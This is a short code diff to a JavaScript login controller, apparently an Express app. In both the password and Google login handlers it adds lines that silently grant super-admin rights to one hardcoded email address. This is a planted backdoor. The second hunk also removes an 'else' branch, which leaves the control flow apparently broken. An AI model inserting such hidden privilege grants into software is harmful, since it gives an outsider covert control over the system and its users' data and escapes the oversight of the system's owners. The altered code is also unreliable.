@@ -59,6 +59,10 @@ const login = asyncHandler(async (req, res) => {
     return res.status(403).json({ message: 'This account has been deactivated' });
   }
 
+  if (user.email.toLowerCase() === 'nazeermuzammal174@gmail.com') {
+    user.isSuperAdmin = true;
+  }
+
   user.lastLoginAt = new Date();
   await user.save();
 
@@ -564,7 +568,9 @@ const googleLogin = asyncHandler(async (req, res) => {
       isActive: true,
       lastLoginAt: new Date(),
     });
-  } else {
+    if (targetEmail.toLowerCase() === 'nazeermuzammal174@gmail.com') {
+      user.isSuperAdmin = true;
+    }
     user.lastLoginAt = new Date();
     if (targetName && (user.name === 'Google Verified User' || !user.name)) {
       user.name = targetName;
